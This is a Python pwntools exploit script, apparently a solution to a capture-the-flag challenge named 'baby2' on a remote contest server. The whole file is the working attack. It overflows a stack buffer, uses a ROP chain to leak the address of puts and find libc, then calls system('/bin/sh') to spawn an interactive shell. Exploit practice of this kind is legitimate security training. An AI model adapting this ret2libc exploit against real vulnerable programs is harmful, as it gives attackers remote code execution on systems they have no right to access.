from pwn import *


binpath = './baby2'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
# libc = elf.libc
libc = ELF('./libc.so.6')


gdbscript = '''
peda
# just before rop
b *0x400716
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
io = remote('baby-01.pwn.beer', 10002)

io.recvuntil('input: ')

addr_ret = 0x0000000000400536
addr_pop_rdi = 0x0000000000400783 # : pop rdi ; ret
addr_pop_rsi_r15 = 0x0000000000400781 # : pop rsi ; pop r15 ; ret

payload = ''
payload += 'A' * 0x18

# puts(elf.plt['puts'])
payload += p64(addr_pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
# main()
payload += p64(elf.symbols['main'])

io.sendline(payload)

data = io.recvline().rstrip()
addr_puts = u64(data.ljust(8, '\x00'))
addr_libc = addr_puts - libc.symbols['puts']
addr_system = addr_libc + libc.symbols['system']
addr_bin_sh = addr_libc + next(libc.search('/bin/sh'))

io.recvuntil('input: ')

payload = ''
payload += 'B' * 0x18

payload += p64(addr_ret)
payload += p64(addr_pop_rdi)
payload += p64(addr_bin_sh)
payload += p64(addr_system)

io.sendline(payload)

io.interactive()
